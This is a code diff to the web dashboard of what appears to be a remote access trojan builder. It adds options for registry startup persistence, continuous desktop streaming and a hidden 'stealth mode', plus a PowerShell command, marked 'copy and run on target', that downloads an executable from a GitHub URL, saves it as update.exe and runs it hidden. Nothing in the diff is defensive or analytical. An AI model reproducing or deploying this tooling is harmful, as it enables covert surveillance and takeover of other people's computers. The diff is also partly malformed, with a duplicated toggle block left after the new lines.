@@ -187,9 +187,62 @@ body{background:#0a0c10;color:#e6edf3;font-family:'Segoe UI',system-ui,-apple-sy
     <h3>Client Configuration</h3>
     <div class="option-row">
       <div class="desc">
+        <label>Client Name <span style="color:#8b949e;font-weight:400">(optional)</span></label>
+        <p>Custom name for this client. Leave empty to use the computer's hostname.</p>
+      </div>
+      <input type="text" id="clientName" placeholder="Auto (hostname)" style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:.4rem .6rem;color:#e6edf3;font-size:.85rem;outline:none;width:180px" oninput="updateBuildCmd()">
+    </div>
+    <div class="option-row">
+      <div class="desc">
         <label>Startup Persistence</label>
         <p>Automatically runs the client on Windows boot via registry (HKCU\Run).</p>
       </div>
+      <label class="toggle">
+        <input type="checkbox" id="startupToggle" checked onchange="updateBuildCmd()">
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Auto Ping</label>
+        <p>Sends status updates every 200ms to keep the dashboard connection alive.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Live Screen Stream</label>
+        <p>Continuously streams the desktop at 5 FPS with automatic cleanup.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <div class="option-row">
+      <div class="desc">
+        <label>Stealth Mode</label>
+        <p>Runs completely hidden with no console window or user-visible traces.</p>
+      </div>
+      <label class="toggle">
+        <input type="checkbox" checked disabled>
+        <span class="slider"></span>
+      </label>
+    </div>
+
+    <div class="build-actions">
+      <button class="btn btn-primary" onclick="downloadClient()">⬇ Download Client</button>
+      <button class="btn btn-accent" onclick="copyBuildCmd()">📋 Copy Build Command</button>
+    </div>
+
+    <div class="install-cmd" id="buildCmdDisplay">
+      <span style="color:#58a6ff">#</span> <span style="color:#8b949e">Build command — copy and run on target:</span>
+      <br><span id="buildCmdText">Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\update.exe"</span>
+      <button class="copy-btn" onclick="copyBuildCmd()">Copy</button>
+    </div>
       <label class="toggle">
         <input type="checkbox" id="startupToggle" checked disabled>
         <span class="slider"></span>
@@ -322,10 +375,24 @@ async function removeClient(name){
  }catch{}
 }
 
-function copyCmd(){
- const cmd='Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\\update.exe"';
- navigator.clipboard.writeText(cmd).then(()=>{
-  const btn=document.querySelector('.copy-btn');
+function buildArgs(){
+ const name=document.getElementById('clientName').value.trim();
+ const startup=document.getElementById('startupToggle').checked;
+ let args='';
+ if(name) args+=' --name "'+name+'"';
+ if(!startup) args+=' --no-startup';
+ return args;
+}
+
+function updateBuildCmd(){
+ const args=buildArgs();
+ const el=document.getElementById('buildCmdText');
+ el.textContent='Invoke-WebRequest -Uri "https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe" -OutFile "$env:TEMP\\update.exe"; Start-Process -WindowStyle Hidden "$env:TEMP\\update.exe"'+args;
+}
+
+function copyBuildCmd(){
+ navigator.clipboard.writeText(document.getElementById('buildCmdText').textContent).then(()=>{
+  const btn=document.querySelector('.install-cmd .copy-btn');
   btn.textContent='Copied!';
   setTimeout(()=>btn.textContent='Copy',2000);
  });
